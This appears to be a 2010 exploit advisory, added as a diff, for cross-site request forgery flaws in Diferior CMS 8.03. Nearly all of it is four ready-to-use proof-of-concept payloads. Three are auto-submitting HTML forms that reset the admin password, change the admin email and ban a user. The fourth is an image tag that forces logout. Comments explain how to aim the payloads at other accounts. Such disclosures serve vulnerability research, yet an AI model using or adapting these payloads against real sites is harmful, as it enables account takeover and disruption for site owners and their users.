@@ -1,0 +1,63 @@
+<!---
+    Title: Diferior CMS 8.03 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Tue 13 Jul 2010 11:50:32 AM EEST
+    Vendor: http://diferior.com/
+    Download: http://diferior.com/post_files/news/diferior-8-03-released/Diferior_v8.03.tar.gz
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Diferior CMS 8.03 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/user/profile/pass.html" method="post">
+                <!--- You can change cust_user to change the password of other user --->
+                <input type="hidden" name="cust_user" value="admin" />
+                <input type="hidden" name="pass1" value="rootroot" />
+                <input type="hidden" name="pass2" value="rootroot" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Change Admin Email ]=-
+    
+    <html>
+        <head>
+            <title>Diferior CMS 8.03 Multiple CSRF Vulnerabilities - Change Admin Email</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/user/profile/email.html" method="post">
+                 <!--- You can change cust_user to change the email of other user --->
+                <input type="hidden" name="cust_user" value="admin" />
+                <input type="hidden" name="email1" value="root@root.com" />
+                <input type="hidden" name="email2" value="root@root.com" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 3 - Ban User ]=-
+    
+    <html>
+        <head>
+            <title>Diferior CMS 8.03 Multiple CSRF Vulnerabilities - Ban User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/user/ban/[username]/2.html" method="post">
+                <input type="hidden" name="warned" value="on" />
+                <input type="hidden" name="noleech" value="on" />
+                <input type="hidden" name="banned" value="on" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 4 - Logout The User/Administrator ]=-
+
+    <img src="http://[domain]/user/logoff.html" alt="Do you see this?" />
+
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
